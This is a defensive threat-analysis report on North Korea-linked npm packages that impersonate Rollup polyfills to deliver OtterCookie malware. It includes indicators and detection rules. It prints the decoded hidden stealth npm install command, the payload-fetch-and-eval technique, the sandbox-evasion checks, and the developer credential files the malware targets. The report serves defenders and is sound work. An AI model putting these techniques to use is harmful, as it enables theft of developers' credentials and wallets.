# Technical Analysis Report: North Korea-Linked npm Supply Chain Attack via Malicious Rollup Polyfill Packages (2026-07-04)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-07-04
Version: 1.1 (FINAL)

<!-- revision: v1.1 — CUT Sigma #2 (Base64 stealth flags, altitude violation / redundant with #1) and Sigma #4 (credential file access, altitude violation / high FP on generic paths). FIX Sigma #5: require vhost.ctl as mandatory anchor or constrain temp-file payloads to /tmp/ paths to eliminate catastrophic /pack false-positive. FIX Sigma #6: downgrade from high to medium and add note that dns_query cannot match URL path /b/3P9BF. FIX YARA OtterCookie_Rollup_Polyfill_Payload: removed standalone $c2_ip and standalone (3 of ($evasion*)) branches from OR chain; require $c2_ip alongside evasion checks. FIX Suricata sid:2026070402 and sid:2026070403: changed alert tcp to alert http so HTTP sticky buffers (http_method, http_uri) activate on non-standard ports 4806/4809. FIX MITRE T1056.001 (Keylogging) replaced with T1219 (Remote Access Software) — nut-tree-fork/nut-js provides keyboard/mouse CONTROL, not keylogging. Added platform note that all Sigma rules are linux-only while malware also targets Windows. -->

## Executive Summary

Six malicious npm packages linked to North Korea's Contagious Interview threat actor (Lazarus subgroup, MITRE G1052) have been identified impersonating the legitimate `rollup-plugin-polyfill-node` package (~295,000 weekly downloads). The primary packages `rollup-packages-polyfill-core` and `rollup-runtime-polyfill-core` embed base64-encoded install commands that silently deploy second-stage payloads (`swift-parse-stream`, `quirky-token`, `react-icon-svgs`, `rollup-plugin-polyfill-connect`) disguised as SVG sanitization utilities. These second-stage packages fetch JavaScript malware from JSONKeeper (a paste-style hosting service) and execute it via `eval()`, delivering a variant of the OtterCookie malware family.

The decrypted payload establishes C2 communication via Socket.IO to `216.126.236[.]244` on ports 4801/4806/4809 and provides: interactive remote terminal sessions, screenshot capture, mouse/keyboard control (Windows via `@nut-tree-fork/nut-js`), browser credential harvesting, cryptocurrency wallet data exfiltration, clipboard content monitoring, and selective file collection targeting developer credentials (AWS, Azure, SSH, AI API keys for Claude/Gemini, editor histories for VS Code/Cursor/Windsurf). The malware implements sandbox/cloud environment evasion checks before execution. All six packages have been removed from the npm registry. This campaign is a continuation of a sustained operation that published 108+ malicious npm packages across 261 versions since at least March 2026.

## Background: Contagious Interview Campaign

Contagious Interview (MITRE G1052) is a North Korea-aligned threat cluster active since 2023 that conducts both cyberespionage and financially motivated operations. The group primarily targets developers through supply chain compromise of package registries (npm, PyPI) and fake job interview lures. Their signature malware families include:

- **BeaverTail**: JavaScript-based infostealer/downloader, typically the first-stage payload
- **OtterCookie**: Modular JavaScript RAT with remote access, credential theft, and clipboard monitoring capabilities
- **InvisibleFerret** (S1245): Python-based backdoor used in later campaign stages

The group has demonstrated operational discipline, including rotating infrastructure, avoiding VirusTotal submissions, and using legitimate services (JSONKeeper, npoint.io, Vercel) as dead-drop resolvers to avoid hardcoding C2 infrastructure directly in packages.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-03-20 | `rollup-plugin-polyfill-route` published as precursor package in same campaign |
| 2026-04 (approx.) | Panther documents 108 malicious npm packages / 261 versions delivering BeaverTail/OtterCookie |
| 2026-04 (approx.) | SafeDep documents `express-session-js` using same `@nut-tree-fork/nut-js` remote control technique |
| 2026-06-30 | JFrog Security Research publishes analysis: "Lazarus-Linked npm Malware Masquerades as Rollup Polyfills" |
| 2026-07-03 | The Hacker News, TheNextWeb, and other outlets publish coverage |
| All packages | Removed from npm registry |

## Technical Analysis of the Malicious Payload

### 1. First Stage: Typosquatting and Hidden Dependency Installation

The two primary packages impersonate the legitimate `rollup-plugin-polyfill-node` project, replicating its description, repository metadata, and package structure. Within the package code, a base64-encoded string conceals a silent npm install command:

**Encoded command** (in `rollup-packages-polyfill-core`):
```
bnBtIGluc3RhbGwgc3dpZnQtcGFyc2Utc3RyZWFtIC0tbm8tc2F2ZSAtLXNpbGVudCAtLW5vLWF1ZGl0IC0tbm8tZnVuZA==
```

**Decoded**:
```
npm install swift-parse-stream --no-save --silent --no-audit --no-fund
```

The stealth flags (`--no-save --silent --no-audit --no-fund`) prevent the installation from appearing in `package.json`, producing console output, or triggering npm audit warnings. This executes at install time before the developer runs any of their own code.

**Package mapping:**
- `rollup-packages-polyfill-core` installs `swift-parse-stream`
- `rollup-runtime-polyfill-core` installs `quirky-token`

### 2. Second Stage: JSON Dead-Drop Payload Fetch

The second-stage packages (`swift-parse-stream`, `quirky-token`, `react-icon-svgs`, `rollup-plugin-polyfill-connect`) present themselves as SVG sanitization utilities. At runtime they fetch a JSON object from JSONKeeper:

```
hxxps://jsonkeeper[.]com/b/3P9BF
```

The JavaScript payload is embedded in the `model` field of the returned JSON and executed via `eval()`. This technique, previously documented by NVISO Labs across 16+ JSONKeeper URLs, allows the threat actor to update the payload without republishing the npm package.

### 3. Third Stage: Environment Checks and C2 Establishment

Before executing its payload, the malware checks for the presence of environment variables indicative of cloud development environments, sandboxes, serverless runtimes, and analysis infrastructure. If any are detected, the malware exits silently:

**Evasion environment variables:**
- `CODESPACE_NAME` (GitHub Codespaces)
- `CODESANDBOX_HOST` (CodeSandbox)
- `VERCEL` (Vercel)
- `AWS_EXECUTION_ENV`, `AWS_REGION`, `AWS_LAMBDA_FUNCTION_NAME` (AWS Lambda)
- `GOOGLE_CLOUD_PROJECT` (GCP)
- `AZURE_FUNCTIONS_ENVIRONMENT` (Azure Functions)
- `DOCKER` (Docker containers)
- `RENDER` (Render)
- `GAE_ENV` (Google App Engine)
- `DYNO` (Heroku)
- `SOCKET_DEV` (Socket.dev analysis)

The decrypted payload (`<tmp>/pack`) acts as a loader that fetches additional components from the C2 server at `216.126.236[.]244`:
- **Port 4801**: Socket.IO-based command and control channel
- **Port 4806**: File upload endpoint for exfiltrated data
- **Port 4809**: Browser database and wallet extension storage upload endpoint

The C2 API uses the endpoint `/api/service/98cb54c0b4ac259d30c9c1ca1ae87c68` for payload retrieval.

### 4. Payload Capabilities

#### Remote Access (OtterCookie variant)
- Interactive remote terminal sessions via Socket.IO
- Arbitrary command execution
- Screenshot capture (via `screenshot-desktop` library)
- Process termination
- Windows-specific mouse/keyboard control via `@nut-tree-fork/nut-js` (cursor movement, clicks, scrolling, keyboard input, hotkeys)

#### Credential and Data Theft
- **Browser credentials**: Chrome, Edge, Brave, Opera (login data, cookies, history)
- **Cryptocurrency wallets**: MetaMask (extension ID: `nkbihfbeogaeaoehlefnkodbefgpgknn`), plus extensions `bfnaelmomeimhlpmgjnjophhpkkoljpa` and `fhbohimaelbohpjbbldcngcnapndodjf`
- **Clipboard monitoring**: Periodic capture of clipboard contents (tokens, wallet addresses, seed phrases) submitted to `/api/service/makelog`
- **Selective file collection**: Files matching patterns `*.env*`, `*.pem`, `*.key`, `*.secret`, `*private key*`, `*secret phrase*`, `*metamask*`, `*bitcoin*`

#### Targeted Configuration Files
- **IDE/Editor History**: VS Code (`Code/User/History`), Cursor (`Cursor/User/History`), Windsurf
- **Cloud Credentials**: AWS (`~/.aws/credentials`), Azure (`~/.azure/`), SSH (`~/.ssh/id_*`), GnuPG (`~/.gnupg/`)
- **AI Tool Configurations**: Anthropic Claude (`~/.claude/`), Google Gemini, Foundry
- **Development Tools**: npm tokens, Git credentials, `.env` files, Z shell history (`~/.zsh_history`)

### 5. Dropped Files

| File | Purpose |
|------|---------|
| `<tmp>/pack` | AES-256-CBC decrypted loader component |
| `<tmp>/scdata` | Remote access / screenshot component |
| `<tmp>/ldata` | Browser/wallet data theft component |
| `vhost.ctl` | Process tracking marker file |

## Indicators of Compromise (Defanged)

### Malicious npm Packages

| Package Name | JFrog XRAY ID |
|-------------|---------------|
| `rollup-packages-polyfill-core` | XRAY-1008625 |
| `rollup-runtime-polyfill-core` | XRAY-1008531 |
| `swift-parse-stream` | XRAY-1005725 |
| `quirky-token` | XRAY-1003392 |
| `rollup-plugin-polyfill-connect` | XRAY-973019 |
| `react-icon-svgs` | XRAY-1011624 |

### Related Prior Campaign Package
- `rollup-plugin-polyfill-route` (published 2026-03-20)

### Network Indicators

| Indicator | Type | Context |
|-----------|------|---------|
| `216[.]126[.]236[.]244` | IPv4 | Primary C2 server (AS14956, Cloudzy VPS) |
| `216[.]126[.]236[.]244:4801` | IPv4:Port | Socket.IO C2 communications |
| `216[.]126[.]236[.]244:4806` | IPv4:Port | File upload endpoint |
| `216[.]126[.]236[.]244:4809` | IPv4:Port | Browser/wallet data exfiltration |
| `hxxps://jsonkeeper[.]com/b/3P9BF` | URL | Malicious JavaScript payload host |
| `/api/service/98cb54c0b4ac259d30c9c1ca1ae87c68` | URI Path | C2 payload fetch endpoint |
| `/api/service/makelog` | URI Path | Clipboard data exfiltration endpoint |
| `/upload` | URI Path | General file exfiltration endpoint (port 4806) |
| `/cldbs` | URI Path | Wallet extension DB exfiltration endpoint (port 4809) |

### Related C2 Infrastructure (Prior Campaigns)
| Indicator | Type | Context |
|-----------|------|---------|
| `216[.]126[.]237[.]71` | IPv4 | OtterCookie C2 (express-session-js campaign) |
| `216[.]126[.]224[.]220` | IPv4 | BeaverTail delivery infrastructure |

### Base64-Encoded Strings

| Encoded | Decoded |
|---------|---------|
| `bnBtIGluc3RhbGwgc3dpZnQtcGFyc2Utc3RyZWFtIC0tbm8tc2F2ZSAtLXNpbGVudCAtLW5vLWF1ZGl0IC0tbm8tZnVuZA==` | `npm install swift-parse-stream --no-save --silent --no-audit --no-fund` |
| `c3dpZnQtcGFyc2Utc3RyZWFt` | `swift-parse-stream` |

### Targeted Browser Extension IDs

| Extension ID | Purpose |
|-------------|---------|
| `nkbihfbeogaeaoehlefnkodbefgpgknn` | MetaMask |
| `bfnaelmomeimhlpmgjnjophhpkkoljpa` | Cryptocurrency wallet extension |
| `fhbohimaelbohpjbbldcngcnapndodjf` | Cryptocurrency wallet extension |

### Dropped File Paths

| Path | Purpose |
|------|---------|
| `<tmp>/pack` | AES-256-CBC decrypted loader |
| `<tmp>/scdata` | Remote access component |
| `<tmp>/ldata` | Browser/wallet theft module |
| `vhost.ctl` | Process tracking marker |

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Campaign Usage |
|-------------|----------------|----------------|
| T1195.001 | Supply Chain Compromise: Compromise Software Dependencies and Development Tools | Malicious npm packages mimicking legitimate Rollup polyfill tools |
| T1036 | Masquerading | Packages replicate legitimate package metadata, descriptions, and structure |
| T1059.007 | Command and Scripting Interpreter: JavaScript | Base64-decoded install commands; eval() of fetched JSON payload |
| T1027 | Obfuscated Files or Information | Base64-encoded npm install commands; AES-256-CBC encrypted payloads |
| T1102.001 | Web Service: Dead Drop Resolver | JSONKeeper used to host and retrieve malicious JavaScript payloads |
| T1071.001 | Application Layer Protocol: Web Protocols | Socket.IO over HTTP for C2 communications |
| T1041 | Exfiltration Over C2 Channel | Stolen data uploaded via C2 ports 4806 and 4809 |
| T1005 | Data from Local System | Collection of credential files, editor history, SSH keys, cloud configs |
| T1555.003 | Credentials from Password Stores: Credentials from Web Browsers | Chrome, Edge, Brave, Opera credential extraction |
| T1115 | Clipboard Data | Periodic clipboard content capture for tokens and seed phrases |
| T1113 | Screen Capture | Screenshot functionality via screenshot-desktop library |
| T1219 | Remote Access Software | Remote keyboard/mouse control via @nut-tree-fork/nut-js |
| T1082 | System Information Discovery | Environment variable checks for sandbox/cloud detection |
| T1083 | File and Directory Discovery | Enumeration of credential files, editor history, and config directories |
| T1657 | Financial Theft | Cryptocurrency wallet data and seed phrase exfiltration |
| T1583.003 | Acquire Infrastructure: Virtual Private Server | C2 hosted on Cloudzy (AS14956) VPS infrastructure |

## Detection & Remediation

### Immediate Actions

1. **Audit npm dependencies**: Search all `package.json` and `package-lock.json` files for the six malicious package names and the precursor `rollup-plugin-polyfill-route`
2. **Network monitoring**: Block C2 IP `216.126.236[.]244` and monitor for connections to ports 4801, 4806, 4809
3. **DNS monitoring**: Alert on DNS queries for `jsonkeeper[.]com` originating from Node.js processes
4. **File system scan**: Search for dropped files `pack`, `scdata`, `ldata`, `vhost.ctl` in temp directories
5. **Credential rotation**: If any malicious packages were installed, rotate all credentials stored in `.aws/credentials`, `.azure/`, `.ssh/`, `.claude/`, npm tokens, and any API keys for AI services

### Proactive Defenses

1. **npm audit**: Run `npm audit` on all projects; enable `--audit-signatures` for provenance verification
2. **Lock file enforcement**: Use `npm ci` instead of `npm install` in CI/CD to enforce lock file integrity
3. **Install hook restrictions**: Configure `.npmrc` with `ignore-scripts=true` for untrusted packages
4. **Socket.dev / Snyk**: Deploy supply chain security tools that detect typosquatting and suspicious install scripts
5. **Environment variable monitoring**: Alert on processes checking for cloud environment variables as an evasion technique

## Detection Rules

### Sigma Rules

> **Platform note:** The Sigma rules below use `product: linux` as their primary log source. The OtterCookie malware also targets Windows (e.g., mouse/keyboard control via `@nut-tree-fork/nut-js` is Windows-specific). Defenders should adapt these rules for Windows `process_creation` and `file_event` log sources as appropriate for their environment.

#### 1. Malicious Rollup Polyfill npm Package Installation

```yaml
title: Malicious Rollup Polyfill npm Package Installation
id: 7a3b1c4e-5d6f-4a8b-9c2d-3e4f5a6b7c8d
status: experimental
description: >
    Detects npm install commands for known malicious packages associated with the North Korea-linked
    Contagious Interview campaign that impersonate legitimate Rollup polyfill tooling. These packages
    deliver OtterCookie/BeaverTail malware for credential theft and remote access.
references:
    - https://thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html
    - https://research.jfrog.com/post/rollup-polyfill-masquerading/
author: Actioner
date: 2026/07/04
tags:
    - attack.t1195.001
    - attack.t1059.007
logsource:
    category: process_creation
    product: linux
detection:
    selection_npm:
        Image|endswith: '/npm'
    selection_install:
        CommandLine|contains:
            - 'install'
    selection_packages:
        CommandLine|contains:
            - 'rollup-packages-polyfill-core'
            - 'rollup-runtime-polyfill-core'
            - 'swift-parse-stream'
            - 'quirky-token'
            - 'react-icon-svgs'
            - 'rollup-plugin-polyfill-connect'
            - 'rollup-plugin-polyfill-route'
    condition: selection_npm and selection_install and selection_packages
falsepositives:
    - None known - these package names are known malicious
level: critical
```

#### 2. OtterCookie C2 Connection to Known Lazarus Infrastructure

```yaml
title: OtterCookie C2 Connection to Known Lazarus Infrastructure
id: 9c5d3e6f-7f8a-4c0d-1e4f-5a6b7c8d9e0f
status: experimental
description: >
    Detects network connections to the known C2 IP address 216.126.236.244 used by the OtterCookie
    malware deployed through malicious rollup polyfill npm packages linked to North Korea's
    Contagious Interview campaign. The C2 uses ports 4801 (Socket.IO), 4806 (file upload), and
    4809 (browser/wallet data exfiltration).
references:
    - https://thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html
    - https://research.jfrog.com/post/rollup-polyfill-masquerading/
author: Actioner
date: 2026/07/04
tags:
    - attack.t1071.001
    - attack.t1041
logsource:
    category: network_connection
    product: linux
detection:
    selection_ip:
        DestinationIp: '216.126.236.244'
    selection_ports:
        DestinationPort:
            - 4801
            - 4806
            - 4809
    condition: selection_ip and selection_ports
falsepositives:
    - None known - this is a confirmed malicious C2 endpoint
level: critical
```

#### 3. OtterCookie Malware Payload Temp File Creation

```yaml
title: OtterCookie Malware Payload Temp File Creation
id: 1e7f5a8b-9b0c-4e2f-3a6b-7c8d9e0f1a2b
status: experimental
description: >
    Detects creation of temporary files used by the OtterCookie malware loader deployed through
    malicious rollup polyfill npm packages. The malware writes AES-256-CBC decrypted payloads
    and component files to the system temp directory with distinctive filenames.
references:
    - https://thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html
    - https://research.jfrog.com/post/rollup-polyfill-masquerading/
author: Actioner
date: 2026/07/04
tags:
    - attack.t1059.007
    - attack.t1005
logsource:
    category: file_event
    product: linux
detection:
    selection_process:
        Image|endswith: '/node'
    selection_marker:
        TargetFilename|endswith: '/vhost.ctl'
    selection_tmpdir:
        TargetFilename|contains: '/tmp/'
    selection_payloads:
        TargetFilename|endswith:
            - '/pack'
            - '/scdata'
            - '/ldata'
    condition: selection_process and (selection_marker or (selection_tmpdir and selection_payloads))
falsepositives:
    - Unlikely - vhost.ctl is a distinctive OtterCookie process marker; temp-dir payloads require /tmp/ path constraint
level: medium
```

#### 4. Suspicious JSONKeeper Payload Fetch by Node.js Process

```yaml
title: Suspicious JSONKeeper Payload Fetch by Node.js Process
id: 2f8a6b9c-0c1d-4f3a-4b7c-8d9e0f1a2b3c
status: experimental
description: >
    Detects Node.js processes resolving jsonkeeper.com via DNS, a paste-style service abused by
    the Contagious Interview campaign to host malicious JavaScript payloads executed via eval().
    Note: This is a domain-level indicator only; the dns_query log source cannot match the specific
    malicious URL path (/b/3P9BF). Correlate with proxy or HTTP logs for higher fidelity.
references:
    - https://thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html
    - https://research.jfrog.com/post/rollup-polyfill-masquerading/
    - https://blog.nviso.eu/2025/11/13/contagious-interview-actors-now-utilize-json-storage-services-for-malware-delivery/
author: Actioner
date: 2026/07/04
tags:
    - attack.t1059.007
    - attack.t1102.001
logsource:
    category: dns_query
    product: linux
detection:
    selection:
        QueryName|endswith: 'jsonkeeper.com'
        Image|endswith: '/node'
    condition: selection
falsepositives:
    - Legitimate applications using jsonkeeper.com for data storage or configuration
level: medium
```

### YARA Rules

```yara
rule OtterCookie_Rollup_Polyfill_Stage1 {
    meta:
        description = "Detects first-stage malicious npm packages mimicking Rollup polyfill tools, containing base64-encoded npm install commands for second-stage payload delivery"
        author = "Actioner"
        date = "2026-07-04"
        reference = "https://thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html"
        reference2 = "https://research.jfrog.com/post/rollup-polyfill-masquerading/"
        threat_actor = "Lazarus / Contagious Interview"
        severity = "critical"

    strings:
        // Base64-encoded npm install command for swift-parse-stream
        $b64_install1 = "bnBtIGluc3RhbGwgc3dpZnQtcGFyc2Utc3RyZWFtIC0tbm8tc2F2ZSAtLXNpbGVudCAtLW5vLWF1ZGl0IC0tbm8tZnVuZA==" ascii wide
        // Base64-encoded module name
        $b64_module = "c3dpZnQtcGFyc2Utc3RyZWFt" ascii wide
        // Malicious package names
        $pkg1 = "rollup-packages-polyfill-core" ascii
        $pkg2 = "rollup-runtime-polyfill-core" ascii
        $pkg3 = "swift-parse-stream" ascii
        $pkg4 = "quirky-token" ascii
        $pkg5 = "react-icon-svgs" ascii
        $pkg6 = "rollup-plugin-polyfill-connect" ascii
        // JSONKeeper payload URL path
        $jsonkeeper = "jsonkeeper.com/b/3P9BF" ascii wide
        // C2 API path
        $api_path = "/api/service/98cb54c0b4ac259d30c9c1ca1ae87c68" ascii wide

    condition:
        any of ($b64_*) or $jsonkeeper or $api_path or (2 of ($pkg*))
}

rule OtterCookie_Rollup_Polyfill_Payload {
    meta:
        description = "Detects the decrypted OtterCookie payload or loader components delivered through malicious Rollup polyfill npm packages, including remote access and credential theft modules"
        author = "Actioner"
        date = "2026-07-04"
        reference = "https://thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html"
        reference2 = "https://research.jfrog.com/post/rollup-polyfill-masquerading/"
        threat_actor = "Lazarus / Contagious Interview"
        severity = "critical"

    strings:
        // C2 IP address
        $c2_ip = "216.126.236.244" ascii wide
        // Socket.IO C2 communication patterns
        $socketio = "socket.io-client" ascii
        // Screenshot capability
        $screenshot = "screenshot-desktop" ascii
        // Clipboard monitoring
        $clipboard = "clipboardy" ascii
        // nut-tree remote control
        $nuttree = "@nut-tree-fork/nut-js" ascii
        // Targeted wallet extension IDs
        $metamask_ext = "nkbihfbeogaeaoehlefnkodbefgpgknn" ascii
        $ext2 = "bfnaelmomeimhlpmgjnjophhpkkoljpa" ascii
        $ext3 = "fhbohimaelbohpjbbldcngcnapndodjf" ascii
        // Environment evasion checks
        $evasion1 = "CODESPACE_NAME" ascii
        $evasion2 = "CODESANDBOX_HOST" ascii
        $evasion3 = "AWS_LAMBDA_FUNCTION_NAME" ascii
        $evasion4 = "GOOGLE_CLOUD_PROJECT" ascii
        $evasion5 = "AZURE_FUNCTIONS_ENVIRONMENT" ascii
        $evasion6 = "SOCKET_DEV" ascii
        // Temp file markers
        $tmpfile1 = "vhost.ctl" ascii
        // Exfil API endpoints
        $exfil1 = "/api/service/makelog" ascii
        $exfil2 = "/upload" ascii
        $exfil3 = "/cldbs" ascii

    condition:
        ($socketio and $screenshot and $clipboard) or
        ($nuttree and $c2_ip) or
        (2 of ($metamask_ext, $ext2, $ext3) and $c2_ip) or
        (any of ($exfil*) and $c2_ip) or
        ($tmpfile1 and $c2_ip) or
        (3 of ($evasion*) and $c2_ip)
}
```

### Suricata Rules

```
alert tcp $HOME_NET any -> 216.126.236.244 4801 (msg:"MALWARE OtterCookie C2 Socket.IO Communication to Lazarus Infrastructure"; flow:established,to_server; content:"socket.io"; nocase; reference:url,thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html; reference:url,research.jfrog.com/post/rollup-polyfill-masquerading/; classtype:trojan-activity; sid:2026070401; rev:1;)

alert http $HOME_NET any -> 216.126.236.244 4806 (msg:"MALWARE OtterCookie File Upload to Lazarus C2 Server"; flow:established,to_server; content:"POST"; http_method; reference:url,thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html; reference:url,research.jfrog.com/post/rollup-polyfill-masquerading/; classtype:trojan-activity; sid:2026070402; rev:2;)

alert http $HOME_NET any -> 216.126.236.244 4809 (msg:"MALWARE OtterCookie Browser/Wallet Data Exfil to Lazarus C2"; flow:established,to_server; content:"/cldbs"; http_uri; reference:url,thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html; reference:url,research.jfrog.com/post/rollup-polyfill-masquerading/; classtype:trojan-activity; sid:2026070403; rev:2;)

alert http $HOME_NET any -> any any (msg:"MALWARE OtterCookie Payload Fetch from JSONKeeper"; flow:established,to_server; content:"jsonkeeper.com"; http_host; content:"/b/3P9BF"; http_uri; reference:url,thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html; reference:url,research.jfrog.com/post/rollup-polyfill-masquerading/; classtype:trojan-activity; sid:2026070404; rev:1;)

alert http $HOME_NET any -> 216.126.236.244 any (msg:"MALWARE OtterCookie C2 API Beacon"; flow:established,to_server; content:"/api/service/98cb54c0b4ac259d30c9c1ca1ae87c68"; http_uri; reference:url,thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html; reference:url,research.jfrog.com/post/rollup-polyfill-masquerading/; classtype:trojan-activity; sid:2026070405; rev:1;)

alert http $HOME_NET any -> 216.126.236.244 any (msg:"MALWARE OtterCookie Clipboard Data Exfil"; flow:established,to_server; content:"/api/service/makelog"; http_uri; reference:url,thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html; reference:url,research.jfrog.com/post/rollup-polyfill-masquerading/; classtype:trojan-activity; sid:2026070406; rev:1;)
```

## Sources

- [The Hacker News - North Korea-Linked npm Packages Mimic Rollup Polyfills to Steal Developer Secrets](https://thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html)
- [JFrog Security Research - Lazarus-Linked npm Malware Masquerades as Rollup Polyfills](https://research.jfrog.com/post/rollup-polyfill-masquerading/)
- [Aardwolf Security - npm Supply Chain Attack Hits Rollup Build Tools](https://aardwolfsecurity.com/npm-supply-chain-attack-rollup/)
- [Panther - Inside DPRK's npm Malware Factory: 108 Packages & 261 Versions](https://panther.com/blog/inside-dprk%E2%80%99s-npm-malware-factory-108-packages-261-versions-and-a-31-day-campaign-wave)
- [SafeDep - Malicious npm Package express-session-js Drops Full RAT Payload](https://safedep.io/malicious-npm-package-express-session-js/)
- [NVISO Labs - Contagious Interview Actors Now Utilize JSON Storage Services for Malware Delivery](https://blog.nviso.eu/2025/11/13/contagious-interview-actors-now-utilize-json-storage-services-for-malware-delivery/)
- [MITRE ATT&CK - Contagious Interview (G1052)](https://attack.mitre.org/groups/G1052/)
- [Cisco Talos - BeaverTail and OtterCookie evolve with a new Javascript module](https://blog.talosintelligence.com/beavertail-and-ottercookie/)
- [Microsoft Security Blog - Contagious Interview: Malware delivered through fake developer job interviews](https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/)
